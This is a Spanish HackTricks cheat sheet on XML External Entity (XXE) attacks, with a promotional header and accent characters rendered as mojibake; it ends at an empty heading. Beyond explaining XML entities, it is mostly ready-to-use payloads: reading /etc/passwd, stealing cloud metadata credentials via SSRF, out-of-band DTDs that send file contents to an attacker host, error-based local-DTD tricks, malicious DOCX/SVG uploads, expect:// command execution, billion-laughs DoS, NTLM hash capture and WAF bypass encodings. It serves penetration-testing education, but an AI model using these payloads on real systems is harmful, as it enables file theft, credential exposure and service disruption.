# XXE - XEE - Entidad Externa XML

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Un ataque de Entidad Externa XML es un tipo de ataque contra una aplicaci√≥n que analiza entrada XML.

## Conceptos b√°sicos de XML

**La mayor parte de esta secci√≥n fue tomada de esta incre√≠ble p√°gina de Portswigger:** [**https://portswigger.net/web-security/xxe/xml-entities**](https://portswigger.net/web-security/xxe/xml-entities)

### ¬øQu√© es XML? <a href="#what-is-xml" id="what-is-xml"></a>

XML significa "lenguaje de marcado extensible". XML es un lenguaje dise√±ado para almacenar y transportar datos. Al igual que HTML, XML utiliza una estructura de √°rbol de etiquetas y datos. A diferencia de HTML, XML no utiliza etiquetas predefinidas, por lo que las etiquetas pueden tener nombres que describan los datos. Anteriormente en la historia de la web, XML estaba de moda como formato de transporte de datos (la "X" en "AJAX" significa "XML"). Pero su popularidad ha disminuido a favor del formato JSON.

### ¬øQu√© son las entidades XML? <a href="#what-are-xml-entities" id="what-are-xml-entities"></a>

Las entidades XML son una forma de representar un elemento de datos dentro de un documento XML, en lugar de usar los datos mismos. Varias entidades est√°n incorporadas en la especificaci√≥n del lenguaje XML. Por ejemplo, las entidades `&lt;` y `&gt;` representan los caracteres `<` y `>`. Estos son metacaracteres utilizados para denotar etiquetas XML, y por lo general deben representarse utilizando sus entidades cuando aparecen dentro de los datos.

### ¬øQu√© son los elementos XML?

Las declaraciones de tipo de elemento establecen las reglas para el tipo y n√∫mero de elementos que pueden aparecer en un documento XML, qu√© elementos pueden aparecer dentro de otros y en qu√© orden deben aparecer. Por ejemplo:

* `<!ELEMENT stockCheck ANY>` Significa que cualquier objeto podr√≠a estar dentro del padre `<stockCheck></stockCheck>`
* \<!ELEMENT stockCheck EMPTY> Significa que deber√≠a estar vac√≠o `<stockCheck></stockCheck>`
* \<!ELEMENT stockCheck (productId,storeId)> Declara que `<stockCheck>` puede tener los hijos `<productId>` y `<storeId>`

### ¬øQu√© es la definici√≥n de tipo de documento? <a href="#what-is-document-type-definition" id="what-is-document-type-definition"></a>

La definici√≥n de tipo de documento XML (DTD) contiene declaraciones que pueden definir la estructura de un documento XML, los tipos de valores de datos que puede contener y otros elementos. La DTD se declara dentro del elemento opcional `DOCTYPE` al inicio del documento XML. La DTD puede estar completamente contenida dentro del documento mismo (conocida como "DTD interna") o puede cargarse desde otro lugar (conocida como "DTD externa") o puede ser una combinaci√≥n de ambas.

### ¬øQu√© son las entidades XML personalizadas? <a href="#what-are-xml-custom-entities" id="what-are-xml-custom-entities"></a>

XML permite que se definan entidades personalizadas dentro de la DTD. Por ejemplo:

`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`

Esta definici√≥n significa que cualquier uso de la referencia de entidad `&myentity;` dentro del documento XML ser√° reemplazado con el valor definido: "`my entity value`".

### ¬øQu√© son las entidades externas XML? <a href="#what-are-xml-external-entities" id="what-are-xml-external-entities"></a>

Las entidades externas XML son un tipo de entidad personalizada cuya definici√≥n se encuentra fuera de la DTD donde se declaran.

La declaraci√≥n de una entidad externa utiliza la palabra clave `SYSTEM` y debe especificar una URL de la cual se debe cargar el valor de la entidad. Por ejemplo:

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`

La URL puede usar el protocolo `file://`, por lo que las entidades externas pueden cargarse desde un archivo. Por ejemplo:

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`

Las entidades externas XML proporcionan el principal medio por el cual surgen los [ataques de entidad externa XML](https://portswigger.net/web-security/xxe).

### ¬øQu√© son las entidades de par√°metro XML?

A veces, los ataques XXE utilizando entidades regulares est√°n bloqueados, debido a alguna validaci√≥n de entrada por parte de la aplicaci√≥n o alg√∫n endurecimiento del analizador XML que se est√° utilizando. En esta situaci√≥n, podr√≠as ser capaz de usar entidades de par√°metro XML en su lugar. Las entidades de par√°metro XML son un tipo especial de entidad XML que solo puede ser referenciada en otro lugar dentro de la DTD. Para los prop√≥sitos actuales, solo necesitas saber dos cosas. Primero, la declaraci√≥n de una entidad de par√°metro XML incluye el car√°cter de porcentaje antes del nombre de la entidad:

`<!ENTITY % myparameterentity "my parameter entity value" >`

Y segundo, las entidades de par√°metro se referencian utilizando el car√°cter de porcentaje en lugar del habitual ampersand: `%myparameterentity;`

Esto significa que puedes probar XXE ciego utilizando detecci√≥n fuera de banda a trav√©s de entidades de par√°metro XML de la siguiente manera:

`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`

Esta carga √∫til XXE declara una entidad de par√°metro XML llamada `xxe` y luego usa la entidad dentro de la DTD. Esto provocar√° una b√∫squeda DNS y una solicitud HTTP al dominio del atacante, verificando que el ataque fue exitoso.

## Ataques principales

[La mayor√≠a de estos ataques fueron probados usando los incre√≠bles laboratorios XEE de Portswiggers: https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)

### Prueba de nueva entidad

En este ataque voy a probar si una simple nueva declaraci√≥n de ENTITY est√° funcionando
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
### Leer archivo

Intentemos leer `/etc/passwd` de diferentes maneras. Para Windows podr√≠as intentar leer: `C:\windows\system32\drivers\etc\hosts`

En este primer caso, observa que SYSTEM "_**file:///**etc/passwd_" tambi√©n funcionar√°.
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
```markdown
![](<../.gitbook/assets/image (221).png>)

Este segundo caso deber√≠a ser √∫til para extraer un archivo si el servidor web est√° utilizando PHP (No es el caso de los laboratorios de Portswigger)
```
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
En este tercer caso, observe que estamos declarando el `Element stockCheck` como ANY
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (222) (1).png>)

### Listado de directorios

En aplicaciones basadas en **Java** podr√≠a ser posible **listar los contenidos de un directorio** mediante XXE con un payload como (solicitando el directorio en lugar del archivo):
```markup
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

Un XXE podr√≠a ser utilizado para abusar de un SSRF dentro de una nube
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### SSRF ciego

Usando la **t√©cnica comentada anteriormente** puedes hacer que el servidor acceda a un servidor que controlas para demostrar que es vulnerable. Pero, si eso no funciona, quiz√°s sea porque **no se permiten entidades XML**, en ese caso podr√≠as intentar usar **entidades de par√°metro XML**:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Blind" SSRF - Exfiltrar datos out-of-band

**En esta ocasi√≥n vamos a hacer que el servidor cargue un nuevo DTD con un payload malicioso que enviar√° el contenido de un archivo v√≠a petici√≥n HTTP (para archivos de m√∫ltiples l√≠neas podr√≠as intentar exfiltrarlo v√≠a** _**ftp://**_**). Esta explicaci√≥n fue tomada de** [**Portswiggers lab aqu√≠**](https://portswigger.net/web-security/xxe/blind)**.**

Un ejemplo de un DTD malicioso para exfiltrar el contenido del archivo `/etc/hostname` es el siguiente:
```markup
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Este DTD realiza los siguientes pasos:

* Define una entidad de par√°metro XML llamada `file`, que contiene el contenido del archivo `/etc/passwd`.
* Define una entidad de par√°metro XML llamada `eval`, que contiene una declaraci√≥n din√°mica de otra entidad de par√°metro XML llamada `exfiltrate`. La entidad `exfiltrate` ser√° evaluada realizando una solicitud HTTP al servidor web del atacante que contiene el valor de la entidad `file` dentro de la cadena de consulta de la URL.
* Utiliza la entidad `eval`, lo que provoca que se realice la declaraci√≥n din√°mica de la entidad `exfiltrate`.
* Utiliza la entidad `exfiltrate`, de modo que su valor se eval√∫a al solicitar la URL especificada.

El atacante debe alojar el DTD malicioso en un sistema que controlen, normalmente carg√°ndolo en su propio servidor web. Por ejemplo, el atacante podr√≠a servir el DTD malicioso en la siguiente URL:\
`http://web-attacker.com/malicious.dtd`

Finalmente, el atacante debe enviar la siguiente carga √∫til XXE a la aplicaci√≥n vulnerable:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### Basado en Errores (DTD Externo)

**En este caso vamos a hacer que el servidor cargue un DTD malicioso que mostrar√° el contenido de un archivo dentro de un mensaje de error (esto es v√°lido solo si puedes ver mensajes de error).** [**Ejemplo de aqu√≠.**](https://portswigger.net/web-security/xxe/blind)

Puedes provocar un mensaje de error de an√°lisis XML que contenga el contenido del archivo `/etc/passwd` utilizando un DTD externo malicioso de la siguiente manera:
```markup
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
Este DTD realiza los siguientes pasos:

* Define una entidad de par√°metro XML llamada `file`, que contiene el contenido del archivo `/etc/passwd`.
* Define una entidad de par√°metro XML llamada `eval`, que contiene una declaraci√≥n din√°mica de otra entidad de par√°metro XML llamada `error`. La entidad `error` ser√° evaluada cargando un archivo inexistente cuyo nombre contiene el valor de la entidad `file`.
* Utiliza la entidad `eval`, lo que provoca que se realice la declaraci√≥n din√°mica de la entidad `error`.
* Utiliza la entidad `error`, de modo que su valor se eval√∫a al intentar cargar el archivo inexistente, resultando en un mensaje de error que contiene el nombre del archivo inexistente, que es el contenido del archivo `/etc/passwd`.

Invoca el error de DTD externo con:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Y deber√≠as ver el contenido del archivo dentro del mensaje de error de la respuesta del servidor web.

![](<../.gitbook/assets/image (223) (1).png>)

_**Por favor, ten en cuenta que el DTD externo nos permite incluir una entidad dentro de la segunda (****`eval`****), pero est√° prohibido en el DTD interno. Por lo tanto, no puedes forzar un error sin usar un DTD externo (generalmente).**_

### **Error Basado (DTD del sistema)**

Entonces, ¬øqu√© pasa con las vulnerabilidades XXE ciegas cuando **las interacciones fuera de banda est√°n bloqueadas** (las conexiones externas no est√°n disponibles)? [Informaci√≥n de aqu√≠](https://portswigger.net/web-security/xxe/blind).

En esta situaci√≥n, a√∫n podr√≠a ser posible **provocar mensajes de error que contengan datos sensibles**, debido a una laguna en la especificaci√≥n del lenguaje XML. Si el **DTD de un documento utiliza una combinaci√≥n de declaraciones DTD internas y externas**, entonces el **DTD interno puede redefinir entidades que est√°n declaradas en el DTD externo**. Cuando esto sucede, se relaja la restricci√≥n sobre el uso de una entidad de par√°metro XML dentro de la definici√≥n de otra entidad de par√°metro.

Esto significa que un atacante puede emplear la t√©cnica XXE basada en errores desde dentro de un DTD interno, siempre que la entidad de par√°metro XML que utilicen est√© **redefiniendo una entidad que est√° declarada dentro de un DTD externo**. Por supuesto, si las conexiones fuera de banda est√°n bloqueadas, entonces el DTD externo no se puede cargar desde una ubicaci√≥n remota. En su lugar, necesita ser un **archivo DTD externo que est√© local en el servidor de la aplicaci√≥n**. _Esencialmente, el ataque implica invocar un archivo DTD que existe en el sistema de archivos local y reutilizarlo para redefinir una entidad existente de manera que provoque un error de an√°lisis que contenga datos sensibles._

Por ejemplo, supongamos que hay un archivo DTD en el sistema de archivos del servidor en la ubicaci√≥n `/usr/local/app/schema.dtd`, y este archivo DTD define una entidad llamada `custom_entity`. Un atacante puede provocar un mensaje de error de an√°lisis XML que contenga el contenido del archivo `/etc/passwd` enviando un DTD h√≠brido como el siguiente:
```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Este DTD realiza los siguientes pasos:

* Define una entidad de par√°metro XML llamada `local_dtd`, que contiene el contenido del archivo DTD externo que existe en el sistema de archivos del servidor.
* Redefine la entidad de par√°metro XML llamada `custom_entity`, que ya est√° definida en el archivo DTD externo. La entidad se redefine como que contiene el [exploit XXE basado en errores](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) que ya se describi√≥, para desencadenar un mensaje de error que contiene el contenido del archivo `/etc/passwd`.
*   Utiliza la entidad `local_dtd`, de modo que el DTD externo se interpreta, incluyendo el valor redefinido de la entidad `custom_entity`. Esto resulta en el mensaje de error deseado.

**Ejemplo del mundo real:** Los sistemas que utilizan el entorno de escritorio GNOME a menudo tienen un DTD en `/usr/share/yelp/dtd/docbookx.dtd` que contiene una entidad llamada `ISOamso`.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

Dado que esta t√©cnica utiliza un **DTD interno, primero necesitas encontrar uno v√°lido**. Puedes hacer esto **instalando** el mismo **OS / Software** que utiliza el servidor y **buscando algunos DTDs predeterminados**, o **obteniendo una lista** de **DTDs predeterminados** dentro de sistemas y **verificar** si alguno de ellos existe:
```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
### Encontrando DTDs dentro del sistema

En el siguiente impresionante repositorio de github puedes encontrar **rutas de DTDs que pueden estar presentes en el sistema**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Adem√°s, si tienes la **imagen Docker del sistema v√≠ctima**, puedes usar la herramienta del mismo repositorio para **escanear** la **imagen** y **encontrar** la ruta de los **DTDs** presentes dentro del sistema. Lee el [Readme de github](https://github.com/GoSecure/dtd-finder) para aprender c√≥mo.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE a trav√©s de analizadores Office Open XML

(Copiado de [**aqu√≠**](https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/))\
Muchas aplicaciones web permiten subir documentos de Microsoft Office y luego extraen algunos detalles de ellos. Por ejemplo, podr√≠as tener una aplicaci√≥n web que te permite importar datos subiendo una hoja de c√°lculo en formato XLSX. En alg√∫n momento, para que el analizador extraiga los datos de la hoja de c√°lculo, necesitar√° **analizar al menos un archivo XML**.

La √∫nica manera de probar esto es generar un **archivo de Microsoft Office que contenga una carga √∫til XXE**, as√≠ que hag√°moslo. Primero, crea un directorio vac√≠o para descomprimir tu documento, ¬°y descompr√≠melo!
```
test$ ls
test.docx
test$ mkdir unzipped
test$ unzip ./test.docx -d ./unzipped/
Archive:  ./test.docx
inflating: ./unzipped/word/numbering.xml
inflating: ./unzipped/word/settings.xml
inflating: ./unzipped/word/fontTable.xml
inflating: ./unzipped/word/styles.xml
inflating: ./unzipped/word/document.xml
inflating: ./unzipped/word/_rels/document.xml.rels
inflating: ./unzipped/_rels/.rels
inflating: ./unzipped/word/theme/theme1.xml
inflating: ./unzipped/[Content_Types].xml
```
Abre `./unzipped/word/document.xml` en tu editor de texto favorito (vim) y edita el **XML para que contenga tu payload XXE favorito**. Lo primero que suelo intentar es una solicitud HTTP, as√≠:
```
<!DOCTYPE x [ <!ENTITY test SYSTEM "http://[ID].burpcollaborator.net/"> ]>
<x>&test;</x>
```
Esas l√≠neas deben insertarse entre los dos objetos XML ra√≠z, as√≠, y por supuesto necesitar√°s reemplazar la URL con una URL que puedas monitorear para las solicitudes:

![Esas l√≠neas deben insertarse entre los dos objetos XML ra√≠z, as√≠](https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png)

Lo √∫nico que queda es **comprimir el archivo para crear tu malicioso archivo poc.docx**. Desde el directorio "descomprimido" que creamos anteriormente, ejecuta lo siguiente:

![Desde el directorio "descomprimido" que creamos anteriormente, ejecuta lo siguiente:](https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png)

Ahora sube el archivo a tu aplicaci√≥n web (con suerte) vulnerable y reza a los dioses del hacking por una solicitud en tus registros de Burp Collaborator.

### Protocolo Jar:

El protocolo `jar` solo est√° disponible en **aplicaciones Java**. Permite acceder a archivos dentro de un archivo **PKZIP** (`.zip`, `.jar`, ...) y funciona para archivos locales y remotos:
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Ser capaz de acceder a archivos dentro de archivos PKZIP es **s√∫per √∫til para abusar de XXE a trav√©s de archivos DTD del sistema.** Consulta [esta secci√≥n para aprender c√≥mo abusar de archivos DTD del sistema](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

#### Detr√°s de escena

1. Realiza una solicitud HTTP para cargar el archivo zip. `https://download.host.com/myarchive.zip`
2. Guarda la respuesta HTTP en una ubicaci√≥n temporal. `/tmp/...`
3. Extrae el contenido del archivo.
4. Lee el `file.zip`
5. Elimina los archivos temporales.

Nota que es posible detener el flujo en el segundo paso. El truco es nunca cerrar la conexi√≥n al servir el archivo. [Estas herramientas pueden ser √∫tiles](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution): una en python `slow_http_server.py` y otra en java `slowserver.jar`.

Una vez que el servidor ha descargado tu archivo, necesitas encontrar su ubicaci√≥n navegando por el directorio temporal. Siendo aleatorio, la ruta del archivo no se puede predecir de antemano.

![Jar](https://gosecure.github.io/xxe-workshop/img/74fac3155d455980.png)

{% hint style="danger" %}
Escribir archivos en un directorio temporal puede ayudar a **escalar otra vulnerabilidad que involucre un recorrido de ruta** (como inclusi√≥n de archivo local, inyecci√≥n de plantilla, XSLT RCE, deserializaci√≥n, etc).
{% endhint %}

### XSS
```markup
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Ataque del Bill√≥n de Risas
```markup
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Ataque Yaml
```markup
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Ataque de Inflado Cuadr√°tico

![](<../.gitbook/assets/image (531).png>)

#### Obtenci√≥n de NTML

En hosts Windows es posible obtener el hash NTML del usuario del servidor web configurando un manejador responder.py:
```
Responder.py -I eth0 -v
```
y enviando la siguiente solicitud
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
Entonces puedes intentar descifrar el hash usando hashcat

## Superficies XXE Ocultas

### XInclude

[Desde aqu√≠.](https://portswigger.net/web-security/xxe)

Algunas aplicaciones **reciben datos enviados por el cliente, los incrustan en el servidor en un documento XML y luego analizan el documento**. Un ejemplo de esto ocurre cuando los datos enviados por el cliente se colocan en una **solicitud SOAP de backend**, que luego es procesada por el servicio SOAP de backend.

En esta situaci√≥n, no puedes llevar a cabo un ataque XXE cl√°sico, porque **no controlas todo el documento XML** y por lo tanto no puedes definir o modificar un elemento `DOCTYPE`. Sin embargo, podr√≠as ser capaz de usar `XInclude` en su lugar. `XInclude` es parte de la especificaci√≥n XML que permite que un documento XML se construya a partir de subdocumentos. Puedes colocar un ataque `XInclude` dentro de cualquier valor de datos en un documento XML, por lo que el ataque se puede realizar en situaciones donde solo controlas un √∫nico elemento de datos que se coloca en un documento XML del lado del servidor.

Para realizar un ataque `XInclude`, necesitas hacer referencia al espacio de nombres `XInclude` y proporcionar la ruta al archivo que deseas incluir. Por ejemplo:
```markup
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
### SVG - Carga de Archivos

[Desde aqu√≠.](https://portswigger.net/web-security/xxe)

Algunas aplicaciones permiten a los usuarios cargar archivos que luego son procesados en el servidor. Algunos formatos de archivo comunes utilizan XML o contienen subcomponentes XML. Ejemplos de formatos basados en XML son los formatos de documentos de oficina como DOCX y formatos de imagen como SVG.

Por ejemplo, una aplicaci√≥n podr√≠a permitir a los usuarios **cargar im√°genes**, y procesar o validar estas en el servidor despu√©s de ser cargadas. Incluso si la aplicaci√≥n espera recibir un formato como PNG o JPEG, la **biblioteca de procesamiento de im√°genes que se est√° utilizando podr√≠a soportar im√°genes SVG**. Dado que el formato SVG utiliza XML, un atacante puede enviar una imagen SVG maliciosa y as√≠ alcanzar superficies de ataque ocultas para vulnerabilidades XXE.
```markup
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Tambi√©n podr√≠as intentar **ejecutar comandos** utilizando el "wrapper" de PHP "expect":
```markup
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
**Nota que la primera l√≠nea del archivo le√≠do o del resultado de la ejecuci√≥n aparecer√° DENTRO de la imagen creada. Por lo tanto, necesitas poder acceder a la imagen que SVG ha creado.**

### **PDF - Carga de archivo**

Lee el siguiente post para **aprender a explotar un XXE cargando un archivo PDF**:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: De x-www-urlencoded a XML

Si una solicitud POST acepta datos en formato XML, podr√≠as intentar explotar un XXE en esa solicitud. Por ejemplo, si una solicitud normal contiene lo siguiente:
```markup
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Entonces podr√≠as enviar la siguiente solicitud, con el mismo resultado:
```markup
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: De JSON a XEE

Para cambiar la solicitud podr√≠as usar una extensi√≥n de Burp llamada ‚Äú**Content Type Converter**‚Äú. [Aqu√≠](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) puedes encontrar este ejemplo:
```markup
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```markup
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Otro ejemplo se puede encontrar [aqu√≠](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## WAF & Protecciones Bypasses

### Base64
```markup
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Este solo funciona si el servidor XML acepta el protocolo `data://`.

### UTF-7

Puedes usar la \[**"Encode Recipe"** de CyberChef aqu√≠]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) para transformar a UTF-7.
```markup
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```markup
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Omisi√≥n del Protocolo file:/

